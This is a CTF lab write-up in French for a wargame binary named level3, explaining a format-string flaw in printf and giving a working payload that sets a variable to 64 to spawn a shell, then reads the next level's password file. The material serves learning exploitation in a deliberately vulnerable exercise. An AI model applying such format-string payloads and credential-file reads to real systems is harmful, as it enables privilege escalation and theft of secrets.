### README - Exploitation du programme `level3`

## Introduction

Nous avons un exécutable `level3` avec les options suivantes :

```bash
GCC stack protector support:            Enabled
Strict user copy checks:                Disabled
Restrict /dev/mem access:               Enabled
Restrict /dev/kmem access:              Enabled
grsecurity / PaX: No GRKERNSEC
Kernel Heap Hardening: No KERNHEAP
System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
```

Lorsque nous l'exécutons, il lit l'entrée standard, l'affiche, puis quitte.

## Code Source Décompilé

Voici le code source décompilé du programme `level3` :

```c
int v() {
  int result; // eax
  char s[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(s, 512, stdin);
  printf(s);
  result = m;
  if (m == 64) {
    fwrite("Wait what?!\n", 1u, 0xCu, stdout);
    return system("/bin/sh");
  }
  return result;
}
// 804988C: using guessed type int m;

int __cdecl main(int argc, const char **argv, const char **envp) {
  return v();
}
```

## Analyse et Identification de la Vulnérabilité

La fonction `v()` utilise `fgets` pour lire l'entrée utilisateur dans un buffer, et `printf` pour afficher cette entrée. Cela rend le programme vulnérable aux attaques de format string.

La condition pour exécuter un shell est que la variable `m` soit égale à 64. En exploitant la vulnérabilité de chaîne de format, nous pouvons écrire la valeur 64 à l'adresse de `m`.

### Adresse de la variable `m`

L'adresse de la variable `m` est : `0x0804988c`.

## Exploitation de la Vulnérabilité

Nous allons utiliser une chaîne de format pour écrire la valeur 64 à l'adresse de `m`, puis déclencher l'exécution de `/bin/sh`.

### Construction du Payload

Le payload sera constitué de l'adresse de `m` suivie de la chaîne de format qui écrira la valeur 64.

### Génération du Payload

Utilisez la commande suivante pour générer et exécuter le payload :

```bash
python -c 'print("\x8c\x98\x04\x08" + "%60x" + "%4$n")' > /tmp/exploit
```

### Exécution du Payload

Utilisez le payload pour exploiter le programme `level3` :

```bash
cat /tmp/exploit - | ./level3
```

### Vérification

Après l'exploitation, nous devrions obtenir un shell :

```bash
whoami
level4
cat /home/user/level4/.pass
```

## Explication des Étapes

1. **Utilisation de la chaîne de format** :
   - La chaîne de format `%60x` remplit l'espace pour atteindre 64 caractères.
   - Le spécificateur `%4$n` écrit le nombre de caractères imprimés (64) à l'adresse de `m` fournie.

2. **Construction du Payload** :
   - Nous incluons l'adresse de `m` en little-endian, puis la chaîne de format pour écrire `64` à cette adresse.

3. **Exécution du Payload** :
   - Le payload est envoyé au programme `level3`, modifiant la valeur de `m` et déclenchant l'exécution de `/bin/sh`.

## Conclusion

En exploitant la vulnérabilité de chaîne de format, nous avons modifié la variable `m` pour obtenir un shell avec les privilèges de `level4`. Cette approche a permis de contourner les protections et de lire le flag pour le niveau suivant.

Level3 passé avec succès !